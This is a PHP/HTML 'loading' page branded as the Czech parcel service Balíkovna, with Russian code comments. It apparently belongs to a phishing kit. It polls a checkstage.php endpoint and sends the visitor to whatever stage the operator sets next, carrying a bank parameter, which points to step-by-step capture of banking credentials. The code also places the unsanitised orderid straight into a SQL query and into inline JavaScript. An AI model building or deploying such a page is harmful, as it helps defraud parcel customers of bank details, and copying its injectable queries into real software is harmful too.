<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./assets/styles/style.css">
    <link rel="stylesheet" href="chat.css">
    <title>balikovna | Načítání</title>
    <style>
        #open-chat-button {
            z-index: 99999 !important;
        }
        .chat-menu-section {
            z-index: 10000 !important;
        }
        #preloader {
            display: flex !important;
        }
    </style>
</head>
<body>
    <?php
        include 'chat.php';
    ?>
    <?php
    $orderid = $_GET['orderid'];
    require_once __DIR__ . '/../vendor/autoload.php';

    $dotenv = Dotenv\Dotenv::createUnsafeImmutable(dirname(__DIR__));
    $dotenv->load();
    
    $dbhost = getenv('dbHost');
    $dblogin = getenv('dbLogin');
    $dbpass = getenv('dbPass');
    $dbport = getenv('dbPort');
    
    ini_set('display_errors', 1);
    $dbconn = pg_connect("host={$dbhost} port={$dbport} dbname=link_infos user={$dblogin} password={$dbpass}");
    $userdbconn = pg_connect("host={$dbhost} port={$dbport} dbname=user_infos user={$dblogin} password={$dbpass}");
        if ($dbconn) {
            $id = $_GET['orderid'];
            $_SESSION['orderid'] = $id;
        }
        $result = pg_query($dbconn, "SELECT * FROM link_infos WHERE orderid='$id'");
        if ($result) {
          $row = pg_fetch_array($result, null, PGSQL_ASSOC);
        }
?>


    <div id="preloader">
        <div class="lds-ripple"><div></div><div></div></div>
    </div>
    <script src="./assets/scripts/hide-menu.js"></script>
    <script src="./script.js"></script>
    <script>
$(window).on('load', function () {
    // Получаем текущий URL
    var currentUrl = window.location.href;

    // Переменная для отслеживания перенаправления
    var isRedirecting = false;

    // Функция проверки стадии
    function checkStage() {
        $.ajax({
            url: '/balikovna/checkstage.php',
            method: 'POST',
            data: {
                orderid: '<?php echo $id ?>',
                currstage: 'loading'
            },
            success: function (stage) {
                // Получаем orderid
                var orderId = <?php echo $id ?>;
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'loading' && stage != '') {
                    console.log(stage)
// Устанавливаем флаг перенаправления
isRedirecting = true;

// Находим позицию "balikovna/" в текущем URL
const currentURL = window.location.href;
const balikovnaPosition = currentURL.indexOf("balikovna/");

// Обрезаем URL после "balikovna/"
const baseURL = currentURL.slice(0, balikovnaPosition + 'balikovna/'.length); // 9 символов в "balikovna/"

// Формируем новый URL для перенаправления пользователя
const url = baseURL + stage + "/?orderid=" + orderId + '&bank=' + "<?php echo $row['bank']?>";

// Перенаправляем пользователя на нужную страницу
window.location.href = url;

                } else {
                    // Повторяем проверку через 1 секунду
                    setTimeout(checkStage, 1000);
                }
            }
        });
    }

    // Вызываем функцию проверки стадии
    checkStage();
});

    </script>
</body>
</html>